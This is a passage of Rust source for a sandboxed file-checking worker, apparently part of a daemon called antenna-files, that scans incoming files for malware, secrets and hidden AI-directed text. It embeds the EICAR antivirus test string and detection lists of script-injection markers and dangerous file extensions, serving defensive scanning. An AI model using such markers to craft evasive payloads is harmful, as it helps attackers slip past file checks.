// SPDX-License-Identifier: AGPL-3.0-only
//! Check worker (SPEC §10 steps 3–4): a separate process that isolates itself (Linux: `crate::sandbox_linux`, macOS:
//! `crate::sandbox_macos`), reads the plaintext of the file from stdin and writes the report and the raw preview
//! (pixels + text) to stdout.
//!
//! Protocol (frames `u32be(length) ‖ CBOR`):
//! 1. daemon → worker: [`WorkerRequest`] (trusted: from the daemon, not from the contact);
//! 2. the worker compiles the YARA rules, isolates itself and answers with [`WorkerReady`]: what exactly is enabled;
//! 3. the daemon verifies the isolation (if it is missing, it kills the worker and does not hand over the file: "could
//!    not check" means refusal);
//! 4. daemon → worker: exactly `size` bytes of plaintext;
//! 5. worker → daemon: [`WorkerResponse`].
//!
//! File parsing is the function [`analyze`] without side effects (unit tests call it without a sandbox).

use std::io::{Read, Write};

use serde::{Deserialize, Serialize};

use crate::cdr;
use crate::detect::{Kind, extension_findings, polyglot_findings, sniff};
use crate::inspect;
use crate::report::{CheckReport, ContentClass, Finding, RawPreview, Severity, Verdict};
use crate::secrets::{TextScanner, printable_strings, scan_text};

/// Worker protocol version.
pub const WORKER_PROTOCOL: u8 = 0;
/// Frame limit for the request and the ready message.
pub const MAX_SMALL_FRAME: usize = 1 << 20;
/// Response frame limit: 8 pages × 1600² × 4 bytes RGBA ≈ 82 MB + 1 MiB of text + the report (a 2048² image is 16 MiB).
pub const MAX_RESPONSE_FRAME: usize = 96 << 20;
/// How much content to hold in memory for structure parsing (more than this goes in windows, see [`analyze`]).
pub const MAX_DEEP: u64 = 256 << 20;
/// Window for large files.
pub const WINDOW: usize = 64 << 20;
/// Overlap of YARA/secret windows.
pub const WINDOW_OVERLAP: usize = 1 << 20;
/// File tail (ZIP is read from the end: 64 KiB of comment + 22 bytes of EOCD).
pub const TAIL: usize = 64 * 1024 + 22;

/// Request daemon → worker.
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct WorkerRequest {
    /// Protocol version.
    pub v: u8,
    /// Exact content size.
    pub size: u64,
    /// Name from the manifest (to compare the extension with the content).
    pub name: String,
    /// Build a preview.
    pub preview: bool,
    /// Render pixels (images, PDF pages). `false` is the sender-side check: only text is needed (secrets inside PDFs
    /// and documents), images are not.
    pub pixels: bool,
    /// Worker memory limit.
    pub mem_bytes: u64,
    /// CPU time limit, s.
    pub cpu_secs: u64,
    /// Additional YARA rules (corporate hook).
    pub extra_rules: Option<String>,
}

/// Worker readiness: what is enabled.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct WorkerReady {
    /// Protocol version.
    pub v: u8,
    /// `full` | `partial` | `none` | `unsupported` (not Linux).
    pub landlock: String,
    /// ABI Landlock.
    pub landlock_abi: u8,
    /// seccomp is enabled.
    pub seccomp: bool,
    /// Seatbelt (macOS) is applied and verified from inside (D-P-12).
    #[serde(default)]
    pub seatbelt: bool,
    /// rlimits are set.
    pub rlimits: bool,
    /// Extra descriptors at the time of isolation.
    pub extra_fds: u32,
    /// Isolation error (the worker does not continue).
    pub error: Option<String>,
    /// YARA-X is compiled.
    pub yara: Option<String>,
}

impl WorkerReady {
    /// Isolation is sufficient for the daemon's OS: Linux, Landlock restricts the file system (ABI ≥ 1) and seccomp is
    /// enabled; macOS, Seatbelt is applied and verified from inside (D-P-12); everywhere, rlimits and not a single
    /// foreign descriptor. Any other OS: no.
    pub fn is_isolated(&self) -> bool {
        #[cfg(target_os = "macos")]
        let os = self.seatbelt;
        #[cfg(not(target_os = "macos"))]
        let os = self.seccomp && self.landlock_abi >= 1 && self.landlock != "none";
        self.error.is_none() && os && self.rlimits && self.extra_fds == 0
    }

    /// String for the report. On macOS memory is enforced not by rlimit but by the daemon's watchdog
    /// (`memory=watchdog`).
    pub fn describe(&self) -> String {
        if cfg!(target_os = "macos") {
            format!(
                "seatbelt={} rlimits={} extra_fds={} memory=watchdog",
                self.seatbelt, self.rlimits, self.extra_fds
            )
        } else {
            format!(
                "landlock={} abi={} seccomp={} rlimits={} extra_fds={}",
                self.landlock, self.landlock_abi, self.seccomp, self.rlimits, self.extra_fds
            )
        }
    }
}

/// Worker response.
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct WorkerResponse {
    /// Report.
    pub report: CheckReport,
    /// Raw preview.
    pub preview: Option<RawPreview>,
}

/// Writes a frame.
pub fn write_frame<T: Serialize>(w: &mut impl Write, v: &T) -> std::io::Result<()> {
    let mut buf = Vec::new();
    ciborium::into_writer(v, &mut buf).map_err(|e| std::io::Error::other(e.to_string()))?;
    w.write_all(&(buf.len() as u32).to_be_bytes())?;
    w.write_all(&buf)?;
    w.flush()
}

/// Reads a frame of at most `max` bytes.
pub fn read_frame<T: serde::de::DeserializeOwned>(
    r: &mut impl Read,
    max: usize,
) -> std::io::Result<T> {
    let mut len = [0u8; 4];
    r.read_exact(&mut len)?;
    let len = u32::from_be_bytes(len) as usize;
    if len > max {
        return Err(std::io::Error::other(format!(
            "frame of {len} bytes > {max}"
        )));
    }
    let mut buf = vec![0u8; len];
    r.read_exact(&mut buf)?;
    let mut rest = &buf[..];
    let v = ciborium::from_reader(&mut rest).map_err(|e| std::io::Error::other(e.to_string()))?;
    if !rest.is_empty() {
        return Err(std::io::Error::other("trailing bytes in frame"));
    }
    Ok(v)
}

/// Parsing environment.
pub struct AnalyzeCtx<'a> {
    /// Secret scanner.
    pub scanner: TextScanner,
    /// YARA rules.
    #[cfg(feature = "yara")]
    pub yara: Option<&'a crate::yara::Rules>,
    /// No YARA (the feature is off).
    #[cfg(not(feature = "yara"))]
    pub _p: std::marker::PhantomData<&'a ()>,
    /// Preview limits.
    pub limits: cdr::Limits,
    /// How much to hold in memory.
    pub max_deep: u64,
}

/// Built-in EICAR check (in case of a build without YARA): the string at the start of the file, followed only by
/// whitespace, ≤ 128 bytes.
pub const EICAR: &[u8] = b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";

fn is_eicar(head: &[u8], size: u64) -> bool {
    size <= 128
        && head.starts_with(EICAR)
        && head[EICAR.len()..]
            .iter()
            .all(|b| b.is_ascii_whitespace() || *b == 0x1A)
}

fn add_unique(findings: &mut Vec<Finding>, new: Vec<Finding>) {
    for f in new {
        if !findings.iter().any(|g| g.code == f.code) {
            findings.push(f);
        }
    }
}

fn secret_findings(kinds: Vec<&'static str>, partial: bool, findings: &mut Vec<Finding>) {
    let new = kinds
        .into_iter()
        .map(|k| {
            Finding::new(
                format!("secret:{k}"),
                Severity::Warn,
                format!("the file contains what looks like a {k} (keys, tokens, passwords and seed phrases need the owner)"),
            )
        })
        .collect();
    add_unique(findings, new);
    if partial {
        add_unique(
            findings,
            vec![Finding::new(
                "secrets_partial",
                Severity::Warn,
                "only the first 256 MiB of text were scanned for secrets",
            )],
        );
    }
}

fn active_content(head: &[u8]) -> bool {
    let h = &head[..head.len().min(4 << 20)];
    [
        &b"<script"[..],
        b"javascript:",
        b"vbscript:",
        b"onload=",
        b"onerror=",
        b"onclick=",
        b"onmouseover=",
        b"onfocus=",
        b"<iframe",
        b"<object",
        b"<embed",
        b"<foreignobject",
        b"http-equiv=\"refresh",
        b"http-equiv=refresh",
        b"<form",
        b"type=\"password",
    ]
    .iter()
    .any(|n| h.windows(n.len()).any(|w| w.eq_ignore_ascii_case(n)))
}

/// Script extensions that Windows/macOS execute on double click (the exec bit decides nothing there).
const SCRIPT_EXT: &[&str] = &[
    "bat",
    "cmd",
    "ps1",
    "psm1",
    "vbs",
    "vbe",
    "jse",
    "wsf",
    "wsh",
    "hta",
    "reg",
    "scr",
    "command",
    "applescript",
    "scpt",
    "lnk",
    "pif",
    "msc",
];

fn find_ci(h: &[u8], n: &[u8]) -> bool {
    h.windows(n.len()).any(|w| w.eq_ignore_ascii_case(n))
}

/// PNG text chunks (tEXt, zTXt, iTXt; compressed ones are inflated by the `png` decoder with its limits): only for the
/// secret scanner, the preview has no metadata.
fn png_text_chunks(data: &[u8]) -> String {
    let mut d = png::Decoder::new(std::io::Cursor::new(data));
    d.set_ignore_text_chunk(false);
    let Ok(r) = d.read_info() else {
        return String::new();
    };
    let info = r.info();
    let mut out = String::new();
    for t in &info.uncompressed_latin1_text {
        out.push_str(&t.keyword);
        out.push(' ');
        out.push_str(&t.text);
        out.push('\n');
    }
    for t in &info.compressed_latin1_text {
        if let Ok(v) = t.get_text() {
            out.push_str(&v);
            out.push('\n');
        }
    }
    for t in &info.utf8_text {
        if let Ok(v) = t.get_text() {
            out.push_str(&v);
            out.push('\n');
        }
    }
    out.truncate(out.len().min(8 << 20));
    out
}

/// Parses the content from `input` (exactly `req.size` bytes): type, polyglots, archives, YARA, secrets, preview.
pub fn analyze(input: &mut dyn Read, req: &WorkerRequest, ctx: &AnalyzeCtx<'_>) -> WorkerResponse {
    let mut findings: Vec<Finding> = Vec::new();
    let mut engines = vec!["signature".to_string(), "polyglot".to_string()];
    let head_len = req.size.min(ctx.max_deep) as usize;
    let mut head = vec![0u8; head_len];
    if let Err(e) = input.read_exact(&mut head) {
        let mut r = CheckReport::failed("short_input", format!("could not read the content: {e}"));
        r.engines = engines;
        return WorkerResponse {
            report: r,
            preview: None,
        };
    }
    let complete = req.size <= ctx.max_deep;
    let kind0 = sniff(&head[..head.len().min(8192)]);

    // Large files: the rest in windows (YARA, secrets in printable strings); only the window and the tail are in
    // memory.
    let mut tail: Vec<u8> = head[head.len().saturating_sub(TAIL)..].to_vec();
    let mut scanned = head.len() as u64;
    if !complete {
        let mut carry = head[head.len().saturating_sub(WINDOW_OVERLAP)..].to_vec();
        let mut left = req.size - head.len() as u64;
        let mut win = vec![0u8; WINDOW];
        while left > 0 {
            let n = (left as usize).min(WINDOW);
            if let Err(e) = input.read_exact(&mut win[..n]) {
                let mut r =
                    CheckReport::failed("short_input", format!("could not read the content: {e}"));
                r.engines = engines;
                return WorkerResponse {
                    report: r,
                    preview: None,
                };
            }
            left -= n as u64;
            scanned += n as u64;
            let mut buf = std::mem::take(&mut carry);
            buf.extend_from_slice(&win[..n]);
            #[cfg(feature = "yara")]
            if let Some(y) = ctx.yara
                && let Ok(f) = y.scan(&buf)
            {
                // Rules anchored to the file start (`at 0`) do not fire in windows; only local patterns do.
                add_unique(
                    &mut findings,
                    f.into_iter()
                        .filter(|f| f.code != "yara:eicar_test_file")
                        .collect(),
                );
            }
            let text = if kind0.is_text() {
                String::from_utf8_lossy(&buf).into_owned()
            } else {
                printable_strings(&buf, 8, WINDOW)
            };
            let (kinds, _) = scan_text(&text, ctx.scanner);
            secret_findings(kinds, false, &mut findings);
            tail = buf[buf.len().saturating_sub(TAIL)..].to_vec();
            carry = buf[buf.len().saturating_sub(WINDOW_OVERLAP)..].to_vec();
        }
    }

    let mut kind = crate::detect::refine_by_tail(kind0, &tail);
    add_unique(
        &mut findings,
        polyglot_findings(
            kind,
            &head[..head.len().min(8192)],
            &tail,
            complete.then_some(&head[..]),
        ),
    );
    if is_eicar(&head, req.size) {
        add_unique(
            &mut findings,
            vec![Finding::new(
                "eicar",
                Severity::Threat,
                "EICAR anti-virus test file",
            )],
        );
    }

    // Archives (not unpacked).
    let mut listing = None;
    let mut members = None;
    if kind.is_zip_family() || kind == Kind::Tar || kind == Kind::Gzip || kind.is_archive() {
        engines.push("archive".into());
        let info = if !complete {
            inspect::ArchiveInfo {
                findings: vec![Finding::new(
                    "archive_too_large_to_inspect",
                    Severity::Warn,
                    format!("archives over {} bytes are not inspected", ctx.max_deep),
                )],
                ..Default::default()
            }
        } else if kind.is_zip_family() {
            inspect::inspect_zip(&head)
        } else if kind == Kind::Tar {
            inspect::inspect_tar(&head[..], head.len() as u64)
        } else if kind == Kind::Gzip {
            inspect::inspect_gzip(&head, &req.name)
        } else {
            inspect::not_inspected(kind)
        };
        if let Some(k) = info.kind {
            kind = k;
        }
        add_unique(&mut findings, info.findings);
        if !info.listing.is_empty() {
            listing = Some(info.listing);
        }
        members = info.members;
    }
    // The extension check uses the refined type (DOCX does not count as "a ZIP under another name").
    add_unique(&mut findings, extension_findings(kind, &req.name));

    // YARA over the file head (fully in memory); for large files the rest already went through the windows above.
    #[cfg(feature = "yara")]
    if let Some(y) = ctx.yara {
        engines.push(crate::yara::engine_name());
        match y.scan(&head) {
            Ok(f) => add_unique(&mut findings, f),
            Err(e) => add_unique(
                &mut findings,
                vec![Finding::new("yara_failed", Severity::Warn, e)],
            ),
        }
    }
    // PDF structure: active content with decoded names (`/J#61vaScript`) and from object streams.
    if kind == Kind::Pdf && complete {
        engines.push("pdf-structure".into());
        match crate::pdfscan::scan(&head) {
            Ok(f) => add_unique(&mut findings, f),
            Err(e) => add_unique(
                &mut findings,
                vec![Finding::new("pdf_unreadable", Severity::Warn, e)],
            ),
        }
    }
    let ext = req
        .name
        .rsplit_once('.')
        .map(|(_, e)| e.to_lowercase())
        .unwrap_or_default();
    if SCRIPT_EXT.contains(&ext.as_str()) {
        add_unique(
            &mut findings,
            vec![Finding::new(
                "script_by_name",
                Severity::Warn,
                format!(".{ext} files are run by the OS on double click"),
            )],
        );
    }
    if kind == Kind::Rtf
        && [
            &b"\\object"[..],
            b"\\objdata",
            b"\\objupdate",
            b"\\objautlink",
        ]
        .iter()
        .any(|n| find_ci(&head, n))
    {
        add_unique(
            &mut findings,
            vec![Finding::new(
                "rtf_embedded_object",
                Severity::Warn,
                "RTF with an embedded OLE object",
            )],
        );
    }

    match kind {
        Kind::Dmg => add_unique(
            &mut findings,
            vec![Finding::new(
                "disk_image",
                Severity::Warn,
                "Apple disk image (UDIF): macOS mounts it, and it can hold apps and installers; contents not inspected",
            )],
        ),
        Kind::Ole2 => add_unique(
            &mut findings,
            vec![Finding::new(
                "legacy_office",
                Severity::Warn,
                "legacy OLE document (.doc/.xls/.ppt/.msi): no safe preview, may contain macros",
            )],
        ),
        Kind::Script => add_unique(
            &mut findings,
            vec![Finding::new(
                "script",
                Severity::Warn,
                "executable script (#!)",
            )],
        ),
        Kind::Html | Kind::Svg | Kind::Xml if active_content(&head) => add_unique(
            &mut findings,
            vec![Finding::new(
                "active_content",
                Severity::Warn,
                "markup with scripts or event handlers (runs when opened in a browser)",
            )],
        ),
        _ => {}
    }
    if !complete && !kind.is_text() {
        add_unique(
            &mut findings,
            vec![Finding::new(
                "partial_check",
                Severity::Warn,
                format!(
                    "structure was checked on the first {} bytes only",
                    ctx.max_deep
                ),
            )],
        );
    }

    // Preview (CDR): not built for threats.
    let threat = CheckReport::verdict_of(&findings) == Verdict::Threat;
    let mut preview = None;
    let mut hidden = 0usize;
    let mut hidden_text = String::new();
    let mut smuggled = 0usize;
    if req.preview && !threat {
        type R = Result<cdr::Extract, (String, Severity, &'static str)>;
        let plain = |p: RawPreview| cdr::Extract {
            preview: p,
            hidden: 0,
            hidden_text: String::new(),
            smuggled: 0,
        };
        let r: Option<R> = if kind.is_raster_image() && complete {
            req.pixels.then(|| {
                cdr::image_preview(&head, kind, &ctx.limits)
                    .map(plain)
                    .map_err(|e| (e, Severity::Threat, "malformed_image"))
            })
        } else if kind == Kind::Pdf && complete {
            Some(
                cdr::pdf_preview(&head, &ctx.limits, req.pixels)
                    .map_err(|e| (e, Severity::Warn, "cdr_failed")),
            )
        } else if matches!(kind, Kind::Docx | Kind::Xlsx | Kind::Pptx | Kind::Odf) && complete {
            Some(
                cdr::office_preview(&head, kind, &ctx.limits)
                    .map_err(|e| (e, Severity::Warn, "cdr_failed")),
            )
        } else if kind.is_text() || kind == Kind::Empty {
            Some(Ok(plain(cdr::text_preview(&head, &ctx.limits))))
        } else {
            listing.take().map(|l| {
                Ok(plain(RawPreview {
                    kind: crate::report::PreviewKind::Archive,
                    text: Some(l),
                    images: vec![],
                    truncated: false,
                }))
            })
        };
        match r {
            Some(Ok(x)) => {
                engines.push(format!("cdr:{:?}", x.preview.kind).to_lowercase());
                hidden = x.hidden;
                hidden_text = x.hidden_text;
                smuggled = x.smuggled;
                preview = Some(x.preview);
            }
            Some(Err((e, sev, code))) => {
                add_unique(&mut findings, vec![Finding::new(code, sev, e)])
            }
            None => {}
        }
        // A type without a safe preview: the agent would decide blindly, so the owner decides (the sender needs no
        // preview).
        if req.pixels && preview.is_none() {
            add_unique(
                &mut findings,
                vec![Finding::new(
                    "no_safe_preview",
                    Severity::Warn,
                    format!("no safe preview for {}", kind.mime()),
                )],
            );
        }
    }
    if hidden > 0 {
        add_unique(
            &mut findings,
            vec![Finding::new(
                "hidden_text",
                Severity::Warn,
                format!("{hidden} characters of text invisible on the page (not in the preview)"),
            )],
        );
    }

    // Secrets: the file text, the extracted preview text or the printable strings of a binary file.
    engines.push("secrets".into());
    let text = if kind.is_text() {
        if head.starts_with(b"\xFF\xFE") || head.starts_with(b"\xFE\xFF") {
            crate::detect::decode_utf16(&head)
        } else {
            String::from_utf8_lossy(&head).into_owned()
        }
    } else {
        let mut t = preview
            .as_ref()
            .and_then(|p| p.text.clone())
            .unwrap_or_default();
        // Text invisible on the page does not go into the preview, but it is searched for secrets (outgoing, SPEC §9).
        t.push('\n');
        t.push_str(&hidden_text);
        if kind == Kind::Png && complete {
            t.push('\n');
            t.push_str(&png_text_chunks(&head));
        }
        t.push('\n');
        t.push_str(&printable_strings(&head, 8, crate::secrets::MAX_SCAN));
        t
    };
    let (kinds, partial) = scan_text(&text, ctx.scanner);
    secret_findings(kinds, partial, &mut findings);
    // Invisible characters in the text of a file or document (Unicode tags, bidi override) are hidden instructions for
    // a model; the preview no longer has them (sanitized), but the owner must know.
    let smug = crate::text::count_invisible(&text).1 + smuggled;
    if smug > 0 {
        add_unique(
            &mut findings,
            vec![Finding::new(
                "invisible_characters",
                Severity::Warn,
                format!(
                    "{smug} invisible tag/bidi characters (hidden text for AI); removed from the preview"
                ),
            )],
        );
    }
    // Archive contents: into the worker's memory with a limit, only for the secret search (nothing is unpacked for the
    // agent).
    let bomb = CheckReport::verdict_of(&findings) == Verdict::Threat;
    if complete && !bomb {
        let budget = ctx.max_deep;
        let r = if kind.is_zip_family() {
            Some(inspect::scan_zip_secrets(&head, ctx.scanner, budget))
        } else if kind == Kind::Gzip {
            Some(inspect::scan_gzip_secrets(&head, ctx.scanner, budget))
        } else {
            None
        };
        if let Some((kinds, partial)) = r {
            secret_findings(kinds, false, &mut findings);
            if partial {
                add_unique(
                    &mut findings,
                    vec![Finding::new(
                        "secrets_partial",
                        Severity::Warn,
                        "nested, encrypted or too large archive members were not scanned for secrets",
                    )],
                );
            }
        }
    }
    if matches!(
        kind,
        Kind::Bzip2 | Kind::Xz | Kind::Zstd | Kind::SevenZip | Kind::Rar | Kind::Ole2 | Kind::Dmg
    ) {
        add_unique(
            &mut findings,
            vec![Finding::new(
                "secrets_not_scanned",
                Severity::Warn,
                format!("{} contents were not scanned for secrets", kind.mime()),
            )],
        );
    }

    // What the content is (D-130), with the facts the own-computer rules and the owner's allowlist name as their rules.
    // Information only: the verdict, and with it everything below level 5, does not change.
    let (class, uninspected) = classify(
        kind,
        &head[..head.len().min(8192)],
        &req.name,
        complete,
        members.as_ref(),
    );
    add_unique(
        &mut findings,
        class_findings(
            kind,
            &head[..head.len().min(8192)],
            &req.name,
            class,
            members.as_ref(),
        ),
    );

    // A threat found after the preview (secrets are not a threat): the preview is not handed over.
    let verdict = CheckReport::verdict_of(&findings);
    if verdict == Verdict::Threat {
        preview = None;
    }
    WorkerResponse {
        report: CheckReport {
            verdict,
            kind,
            mime: kind.mime().to_string(),
            findings,
            scanned_bytes: scanned,
            engines,
            sandbox: String::new(),
            class: Some(class),
            uninspected,
        },
        preview,
    }
}

/// What the content is (D-130) and whether an archive's members were not all opened. A native executable and an
/// installer by their format first; an archive by its members (`None`: not opened, too large or a format the worker
/// does not open); text as code when its kind is markup or a script, or its name says code; everything else other.
pub fn classify(
    kind: Kind,
    head: &[u8],
    name: &str,
    complete: bool,
    members: Option<&inspect::Members>,
) -> (ContentClass, bool) {
    if kind.is_native_executable() {
        return (ContentClass::Executable, false);
    }
    if matches!(kind, Kind::Dmg | Kind::Apk)
        || crate::detect::installer_format(head, kind, name).is_some()
    {
        return (ContentClass::Installer, false);
    }
    if kind.is_container() {
        return match members {
            Some(m) if complete => (m.class(), !m.complete()),
            Some(m) => (m.class(), true),
            None => (ContentClass::Other, true),
        };
    }
    if kind.is_text() || kind == Kind::Empty {
        if kind == Kind::Rtf {
            return (ContentClass::Other, false);
        }
        let code = matches!(kind, Kind::Html | Kind::Xml | Kind::Svg | Kind::Script)
            || crate::detect::is_code_name(name);
        return (
            if code {
                ContentClass::Code
            } else {
                ContentClass::Text
            },
            false,
        );
    }
    (ContentClass::Other, false)
}

/// The facts of [`classify`] as information findings, so that a hold names the rule that matched: an archive's
/// executables, installers and unopened members, and an installer or a package by its format.
fn class_findings(
    kind: Kind,
    head: &[u8],
    name: &str,
    class: ContentClass,
    members: Option<&inspect::Members>,
) -> Vec<Finding> {
    let mut out = Vec::new();
    if let Some(m) = members {
        if m.executables > 0 {
            out.push(Finding::new(
                "archive_member_executable",
                Severity::Info,
                format!(
                    "the archive holds {} native executable(s) (ELF, PE, Mach-O)",
                    m.executables
                ),
            ));
        }
        if m.installers > 0 {
            out.push(Finding::new(
                "archive_member_installer",
                Severity::Info,
                format!(
                    "the archive holds {} disk image(s), installer(s) or package(s)",
                    m.installers
                ),
            ));
        }
        if m.unopened > 0 {
            out.push(Finding::new(
                "archive_member_unopened",
                Severity::Info,
                format!(
                    "{} archive member(s) were not opened (encrypted, unreadable, nested archives or past the limit): what they are is not known",
                    m.unopened
                ),
            ));
        }
    }
    if class == ContentClass::Installer && !kind.is_container() && kind != Kind::Dmg {
        let what = crate::detect::installer_format(head, kind, name).unwrap_or("Android package");
        out.push(Finding::new(
            "installer_package",
            Severity::Info,
            format!("an installer or package ({what}): it installs software when opened"),
        ));
    }
    out
}

/// Entry point of the worker process (the binary `antenna-files-sandbox check`; in stage B, a hidden `antennad`
/// subcommand). Does not return.
pub fn worker_main(scanner: TextScanner) -> ! {
    let mut stdin = std::io::stdin().lock();
    let mut stdout = std::io::stdout().lock();
    let req: WorkerRequest = match read_frame(&mut stdin, MAX_SMALL_FRAME) {
        Ok(r) => r,
        Err(e) => {
            eprintln!("antenna-files worker: bad request: {e}");
            std::process::exit(2);
        }
    };
    if req.v != WORKER_PROTOCOL {
        eprintln!("antenna-files worker: protocol {} unsupported", req.v);
        std::process::exit(2);
    }
    // Rules are compiled before isolation: compilation does not touch untrusted data.
    #[cfg(feature = "yara")]
    let yara = crate::yara::Rules::compile(req.extra_rules.as_deref());
    #[cfg(feature = "yara")]
    let yara_name = yara.as_ref().ok().map(|_| crate::yara::engine_name());
    #[cfg(not(feature = "yara"))]
    let yara_name: Option<String> = None;

    // Outside Linux and macOS there is no isolation and `ready` does not change (the check fails closed).
    #[cfg_attr(
        not(any(target_os = "linux", target_os = "macos")),
        allow(
            unused_mut,
            reason = "no isolation outside Linux and macOS, so nothing updates `ready`"
        )
    )]
    let mut ready = WorkerReady {
        v: WORKER_PROTOCOL,
        landlock: "unsupported".into(),
        landlock_abi: 0,
        seccomp: false,
        seatbelt: false,
        rlimits: false,
        extra_fds: 0,
        error: None,
        yara: yara_name,
    };
    // macOS: Seatbelt + rlimits (D-P-12, M-15); memory is enforced by the watchdog in the daemon.
    #[cfg(target_os = "macos")]
    {
        let lim = crate::sandbox_macos::ResourceLimits {
            mem_bytes: req.mem_bytes,
            cpu_secs: req.cpu_secs,
        };
        match crate::sandbox_macos::apply(&lim) {
            Ok(a) => {
                ready.seatbelt = a.seatbelt;
                ready.rlimits = a.rlimits;
                ready.extra_fds = a.extra_fds;
            }
            Err(e) => ready.error = Some(e),
        }
    }
    #[cfg(target_os = "linux")]
    {
        let lim = crate::sandbox_linux::ResourceLimits {
            mem_bytes: req.mem_bytes,
            cpu_secs: req.cpu_secs,
        };
        match crate::sandbox_linux::apply(&lim) {
            Ok(a) => {
                ready.landlock = a.landlock;
                ready.landlock_abi = a.landlock_abi;
                ready.seccomp = a.seccomp;
                ready.rlimits = a.rlimits;
                ready.extra_fds = a.extra_fds;
            }
            Err(e) => ready.error = Some(e),
        }
    }
    let describe = ready.describe();
    if write_frame(&mut stdout, &ready).is_err() || ready.error.is_some() {
        std::process::exit(3);
    }
    let ctx = AnalyzeCtx {
        scanner,
        #[cfg(feature = "yara")]
        yara: yara.as_ref().ok(),
        #[cfg(not(feature = "yara"))]
        _p: std::marker::PhantomData,
        limits: cdr::Limits::default(),
        max_deep: MAX_DEEP,
    };
    let mut resp = analyze(&mut stdin, &req, &ctx);
    resp.report.sandbox = describe;
    #[cfg(feature = "yara")]
    if let Err(e) = &yara {
        resp.report
            .push(Finding::new("yara_failed", Severity::Warn, e.clone()));
    }
    if write_frame(&mut stdout, &resp).is_err() {
        std::process::exit(4);
    }
    std::process::exit(0);
}

/// Parses the worker process arguments: `check`, `selftest <probe> [argument]`, `selftest-landlock-only <probe>
/// [argument]`, `av-exec …`. Unknown arguments give `None` (the caller prints a hint). Known modes do not return.
pub fn dispatch(args: &[String]) -> Option<i32> {
    match args.first().map(String::as_str) {
        Some("check") => worker_main(crate::secrets::scan_secrets),
        Some("selftest") if (2..=3).contains(&args.len()) => {
            selftest_main(&args[1], args.get(2).map(String::as_str), true)
        }
        Some("selftest-landlock-only") if (2..=3).contains(&args.len()) => {
            selftest_main(&args[1], args.get(2).map(String::as_str), false)
        }
        Some("av-exec") => av_exec_main(&args[1..]),
        _ => None,
    }
}

/// Runs the external antivirus under isolation (`antenna-files-sandbox av-exec --ro <path>… --rw <dir> --mem <bytes>
/// --cpu <s> -- <program> <arguments>…`): Landlock (read only `--ro`, write only `--rw`, TCP closed), seccomp without
/// network, rlimits, empty environment (`TMPDIR` = `--rw`); then `exec` of the program. Does not return.
pub fn av_exec_main(args: &[String]) -> ! {
    let fail = |msg: &str| -> ! {
        eprintln!("antenna-files av-exec: {msg}");
        std::process::exit(126);
    };
    let mut ro = Vec::new();
    let mut rw = None;
    let mut mem: u64 = 2 << 30;
    let mut cpu: u64 = 300;
    let mut i = 0;
    while i < args.len() {
        match args[i].as_str() {
            "--ro" if i + 1 < args.len() => {
                ro.push(std::path::PathBuf::from(&args[i + 1]));
                i += 2;
            }
            "--rw" if i + 1 < args.len() => {
                rw = Some(std::path::PathBuf::from(&args[i + 1]));
                i += 2;
            }
            "--mem" if i + 1 < args.len() => {
                mem = args[i + 1].parse().unwrap_or_else(|_| fail("bad --mem"));
                i += 2;
            }
            "--cpu" if i + 1 < args.len() => {
                cpu = args[i + 1].parse().unwrap_or_else(|_| fail("bad --cpu"));
                i += 2;
            }
            "--" => {
                i += 1;
                break;
            }
            _ => fail("bad arguments"),
        }
    }
    let Some(rw) = rw else {
        fail("--rw is required")
    };
    let Some(program) = args.get(i) else {
        fail("program is required")
    };
    let program = std::path::PathBuf::from(program);
    if !program.is_absolute() || !rw.is_absolute() || ro.iter().any(|p| !p.is_absolute()) {
        fail("paths must be absolute");
    }
    #[cfg(target_os = "linux")]
    {
        let lim = crate::sandbox_linux::ResourceLimits {
            mem_bytes: mem,
            cpu_secs: cpu,
        };
        if let Err(e) = crate::sandbox_linux::apply_exec(&lim, &ro, &rw) {
            fail(&e);
        }
        use std::os::unix::process::CommandExt;
        let e = std::process::Command::new(&program)
            .args(&args[i + 1..])
            .env_clear()
            .env("TMPDIR", &rw)
            .current_dir(&rw)
            .exec();
        fail(&format!("exec: {e}"));
    }
    // macOS: Seatbelt: read and execute only system paths and `--ro`, write only to `--rw`, no network (D-P-12).
    #[cfg(target_os = "macos")]
    {
        let lim = crate::sandbox_macos::ResourceLimits {
            mem_bytes: mem,
            cpu_secs: cpu,
        };
        if let Err(e) = crate::sandbox_macos::apply_exec(&lim, &ro, &rw, &program) {
            fail(&e);
        }
        use std::os::unix::process::CommandExt;
        let e = std::process::Command::new(&program)
            .args(&args[i + 1..])
            .env_clear()
            .env("TMPDIR", &rw)
            .current_dir(&rw)
            .exec();
        fail(&format!("exec: {e}"));
    }
    #[cfg(not(any(target_os = "linux", target_os = "macos")))]
    {
        let _ = (mem, cpu, program);
        fail("no sandbox on this platform");
    }
}

/// A variable the system sets in the process itself, not one passed by the parent. On macOS that is exactly
/// `__CF_USER_TEXT_ENCODING`: CoreFoundation, loaded with the system frameworks, sets it at startup when the environment
/// lacks it, to this process's uid and the user's text encoding and region (`0x<uid>:0x<encoding>:0x<region>`). The
/// worker is started with an empty environment, so it carries nothing from the daemon; a value of another shape or
/// with another uid is counted as passed in.
fn set_by_the_system(name: &str, value: &str) -> bool {
    if !cfg!(target_os = "macos") || name != "__CF_USER_TEXT_ENCODING" {
        return false;
    }
    let hex = |f: &str| {
        f.strip_prefix("0x")
            .filter(|h| !h.is_empty() && h.len() <= 8)
            .and_then(|h| u32::from_str_radix(h, 16).ok())
    };
    let f: Vec<Option<u32>> = value.split(':').map(hex).collect();
    f.len() == 3 && f.iter().all(Option::is_some) && f[0] == own_uid()
}

#[cfg(unix)]
fn own_uid() -> Option<u32> {
    Some(rustix::process::getuid().as_raw())
}

/// Windows has no uid (and no `__CF_USER_TEXT_ENCODING`).
#[cfg(windows)]
fn own_uid() -> Option<u32> {
    None
}

/// Isolation self-test (`antenna-files-sandbox selftest <probe> [argument]`): the worker isolates itself with the same
/// settings and tries forbidden actions. Prints `probe=<name> result=<blocked|ALLOWED> detail=…` and exits with 0.
/// Probes on which seccomp kills the process (`socket`, `exec`, `thread`) do not live to print; that is the answer.
/// Probes with an argument (for tests): `read_path <path>`, `write_path <path>`, `connect <address:port>`.
pub fn selftest_main(probe: &str, arg: Option<&str>, with_seccomp: bool) -> ! {
